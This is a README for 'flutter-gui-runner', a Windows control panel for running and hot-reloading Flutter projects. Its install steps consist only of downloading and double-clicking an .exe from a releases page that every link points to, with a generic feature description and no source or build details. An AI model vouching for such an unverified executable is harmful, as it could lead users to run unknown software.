# 💻 flutter-gui-runner - Manage your Flutter projects with ease

[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)

## 📌 About this software

This tool acts as a bridge between your code editor and your Flutter installation. You do not need to use the command line to build or run your applications. The interface provides a simple way to track your work, restart your build process, and see changes in your app instantly.

It helps developers who prefer using light editors like Zed or Neovim but still want the convenience of a visual control panel. The software automates the background tasks required to keep your Flutter code running.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- Flutter SDK installed and configured
- A code editor like Zed, Neovim, or VS Code
- A stable internet connection for the first run

## 📥 Getting Started

Follow these steps to set up the software on your machine:

1. Visit the [releases page](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases) to access the download files.
2. Look for the file ending in .exe for Windows.
3. Click the link to save the file to your computer.
4. Open the folder where you saved the file.
5. Double-click the file to start the installation process.
6. Follow the prompts on the screen to complete the setup.

## ⚙️ How to use the application

Once you finish the installation, you can launch the application from your Start menu. The main screen displays a list of your open projects. 

### Connecting your project
Select the folder containing your Flutter source code. The application detects the project structure and prepares the environment. You do not need to install plugins inside your editor. The software handles the interaction directly.

### Running your app
Click the play button inside the control panel to launch your application. The software automatically handles the build process. If the build fails, the panel displays simple error messages to help you fix the issue.

### Using Hot Reload
Keep your code editor open alongside the control panel. When you save your changes in your editor, the app pushes those changes to your running simulator or device. This happens in the background without manual intervention.

## 🚀 Advanced Features

### Agentic Mode
The software includes a feature to assist with common coding tasks. It monitors your file changes and suggests improvements. You can toggle this feature in the settings menu.

### Terminal Output
The panel includes a clean window for logs. This window shows exactly what happens during the compilation of your code. You can clear this window at any time to focus on new messages.

### Custom Settings
You can change the behavior of the build tools within the settings screen. Configure your preferred device targets, environment variables, and build modes. The application saves these settings for all future sessions.

## 📂 Troubleshooting

If the application fails to launch or cannot find your Flutter installation, verify these common fixes:

- Ensure the Flutter SDK appears in your system path. Open a command prompt and type `flutter --version`. If it returns a version number, the installation is correct.
- Check if another process uses the same port as your Flutter app. You can stop those processes using the Task Manager. 
- Restart the application after changing any system environment variables.
- Ensure you have the latest drivers for your graphics card, as this affects the performance of the visual output window.

## 🌐 Community and Support

The project benefits from a community of contributors who improve the tool regularly. Check the link below to stay updated on new releases or to report bugs.

[View Releases and Updates](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)

We encourage users to review the issue tracker before submitting reports. If you find a bug, provide a clear description of the steps to reproduce it. This helps other developers fix the issue quickly.